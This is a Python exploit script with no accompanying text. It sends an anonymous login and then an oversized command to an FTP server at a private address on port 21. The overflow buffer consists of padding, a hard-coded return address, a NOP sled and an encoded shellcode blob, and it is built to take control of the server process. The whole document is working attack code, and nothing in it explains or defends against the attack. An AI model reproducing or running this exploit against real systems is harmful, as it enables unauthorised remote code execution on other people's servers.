import socket, os, sys



buf =  b""                                                                                                       
buf += b"\xbf\x2f\x4d\xf5\xb5\xdb\xd6\xd9\x74\x24\xf4\x5b\x33"                                                   
buf += b"\xc9\xb1\x52\x31\x7b\x12\x03\x7b\x12\x83\xc4\xb1\x17"                                                   
buf += b"\x40\xe6\xa2\x5a\xab\x16\x33\x3b\x25\xf3\x02\x7b\x51"                                                   
buf += b"\x70\x34\x4b\x11\xd4\xb9\x20\x77\xcc\x4a\x44\x50\xe3"                                                   
buf += b"\xfb\xe3\x86\xca\xfc\x58\xfa\x4d\x7f\xa3\x2f\xad\xbe"                                                   
buf += b"\x6c\x22\xac\x87\x91\xcf\xfc\x50\xdd\x62\x10\xd4\xab"                                                   
buf += b"\xbe\x9b\xa6\x3a\xc7\x78\x7e\x3c\xe6\x2f\xf4\x67\x28"
buf += b"\xce\xd9\x13\x61\xc8\x3e\x19\x3b\x63\xf4\xd5\xba\xa5"
buf += b"\xc4\x16\x10\x88\xe8\xe4\x68\xcd\xcf\x16\x1f\x27\x2c"
buf += b"\xaa\x18\xfc\x4e\x70\xac\xe6\xe9\xf3\x16\xc2\x08\xd7"
buf += b"\xc1\x81\x07\x9c\x86\xcd\x0b\x23\x4a\x66\x37\xa8\x6d"
buf += b"\xa8\xb1\xea\x49\x6c\x99\xa9\xf0\x35\x47\x1f\x0c\x25"
buf += b"\x28\xc0\xa8\x2e\xc5\x15\xc1\x6d\x82\xda\xe8\x8d\x52"
buf += b"\x75\x7a\xfe\x60\xda\xd0\x68\xc9\x93\xfe\x6f\x2e\x8e"
buf += b"\x47\xff\xd1\x31\xb8\xd6\x15\x65\xe8\x40\xbf\x06\x63"
buf += b"\x90\x40\xd3\x24\xc0\xee\x8c\x84\xb0\x4e\x7d\x6d\xda"
buf += b"\x40\xa2\x8d\xe5\x8a\xcb\x24\x1c\x5d\x34\x10\x1f\x94"
buf += b"\xdc\x63\x1f\xa2\xce\xed\xf9\xc0\xfe\xbb\x52\x7d\x66"
buf += b"\xe6\x28\x1c\x67\x3c\x55\x1e\xe3\xb3\xaa\xd1\x04\xb9"
buf += b"\xb8\x86\xe4\xf4\xe2\x01\xfa\x22\x8a\xce\x69\xa9\x4a"
buf += b"\x98\x91\x66\x1d\xcd\x64\x7f\xcb\xe3\xdf\x29\xe9\xf9"
buf += b"\x86\x12\xa9\x25\x7b\x9c\x30\xab\xc7\xba\x22\x75\xc7"
buf += b"\x86\x16\x29\x9e\x50\xc0\x8f\x48\x13\xba\x59\x26\xfd"
buf += b"\x2a\x1f\x04\x3e\x2c\x20\x41\xc8\xd0\x91\x3c\x8d\xef"
buf += b"\x1e\xa9\x19\x88\x42\x49\xe5\x43\xc7\x79\xac\xc9\x6e"
buf += b"\x12\x69\x98\x32\x7f\x8a\x77\x70\x86\x09\x7d\x09\x7d"
buf += b"\x11\xf4\x0c\x39\x95\xe5\x7c\x52\x70\x09\xd2\x53\x51"

buffer = "A" * 251 + "\xee\x4e\xe5\x6d" + "\x90" * 16 + buf + "C" * (1000-(275+len(buf)))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.1.8', 21))

s.recv(1024)

s.send('USER anonymous\r\n')

s.recv(1024)

s.send('PASS anonymous\r\n')

s.recv(1024)

s.send(buffer + '\r\n')

s.send('QUIT\r\n')

s.close()